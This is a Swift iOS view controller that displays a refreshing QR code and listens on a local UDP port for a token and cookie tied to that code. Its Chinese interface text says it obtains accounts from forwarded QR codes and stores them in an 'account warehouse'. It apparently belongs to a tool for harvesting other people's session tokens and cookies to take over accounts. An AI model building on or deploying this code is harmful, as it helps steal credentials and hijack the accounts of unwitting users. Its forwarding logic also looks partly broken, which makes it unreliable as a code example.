import UIKit
import CoreImage.CIFilterBuiltins
import Network

class ViewController: UIViewController {
    var listener: NWListener!
    var sceneID: String = ""
    var timer: Timer?
    let qrImageView = UIImageView()
    let tipLabel = UILabel()

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .white
        setupUI()
        openUDP()
        refreshCode()
        timer = Timer.scheduledTimer(timeInterval: 25, target: self, selector: #selector(refreshCode), repeats: true)
    }

    func setupUI() {
        qrImageView.frame = CGRect(x: 40, y: 120, width: 300, height: 300)
        qrImageView.contentMode = .scaleAspectFit
        view.addSubview(qrImageView)
        tipLabel.frame = CGRect(x: 20, y: 440, width: 340, height: 40)
        tipLabel.textAlignment = .center
        tipLabel.text = "转发二维码QQ识别，获取账号"
        view.addSubview(tipLabel)
    }

    @objc func refreshCode() {
        sceneID = UUID().uuidString
        let content = "delta_scene|\(sceneID)"
        qrImageView.image = createQR(text: content)
    }

    func openUDP() {
        let udp = NWParameters.udp
        listener = try! NWListener(using: udp, on: NWEndpoint.Port(rawValue: 16688)!)
        listener.stateUpdateHandler = { state in
            if state == .ready {
                self.listener.newConnectionHandler = { conn in
                    conn.start(queue: .global())
                    conn.receive(minimumIncompleteLength: 1, maximumLength: 4096) { data, _, _, _ in
                        guard let data = data, let msg = String(data: data, encoding: .utf8) else { return }
                        let arr = msg.components(separatedBy: "|")
                        if arr.count >= 3, arr[0] == self.sceneID {
                            let tk = arr[1]
                            let ck = arr[2]
                            DispatchQueue.main.async {
                                self.tipLabel.text = "获取账号成功，自动存入二号账号仓库"
                                self.qrImageView.image = self.createQR(text: "SUCCESS")
                                self.sendToAccountBox(token: tk, cookie: ck)
                                self.timer?.invalidate()
                            }
                        }
                    }
                }
            }
        }
        listener.start(queue: .global())
    }

    func sendToAccountBox(token: String, cookie: String) {
        let sendData = "new_account|\(token)|\(cookie)"
        let conn = NWConnection(to: .init(hostname: "127.0.0.1", port: 16688), using: NWParameters.udp)
        conn.start(queue: .global())
        conn.send(content: sendData.data(using: .utf8), completion: .contentProcessed({ _ in }))
    }

    func createQR(text: String) -> UIImage? {
        let filter = CIFilter.qrCodeGenerator()
        filter.setValue(text.data(using: .utf8), forKey: "inputMessage")
        guard let img = filter.outputImage?.transformed(by: CGAffineTransform(scaleX: 9, y: 9)) else { return nil }
        return UIImage(ciImage: img)
    }
}